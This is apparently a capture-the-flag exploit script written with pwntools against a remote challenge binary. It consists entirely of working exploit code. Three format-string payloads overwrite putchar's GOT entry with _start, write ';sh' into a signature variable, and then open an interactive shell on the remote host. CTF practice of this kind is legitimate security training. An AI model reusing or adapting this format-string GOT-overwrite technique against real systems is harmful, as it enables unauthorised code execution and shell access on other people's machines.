from pwn import *

# r = process('./chall')
r = remote('103.245.250.31', 32183)
bin = ELF('./chall')
context.clear(os='linux', arch='x86_64', log_level='debug')

def send():
    r.sendafter(b'e. All I Ask - Adele\n', b' e')

signature = 0x404090
part1 = bin.symbols['_start'] & 0xffff
payload = (f'%{part1}c%12$hn').encode().ljust(16, b'\x00') + \
        p64(bin.got['putchar'])
r.sendlineafter(b'your name?\n', payload)
send()

part1 = int.from_bytes(b';sh', 'little')
payload = (f'%{part1}c%12$n').encode().ljust(16, b'\x00') + p64(signature+1)
r.sendlineafter(b'your name?\n', payload)
send()

# gdb.attach(r, '''b*main+231''')
payload = b'%12$hhn'.ljust(0x10, b'\x00') + p64(bin.got['putchar'])
r.sendlineafter(b'your name?\n', payload)
send()

r.interactive()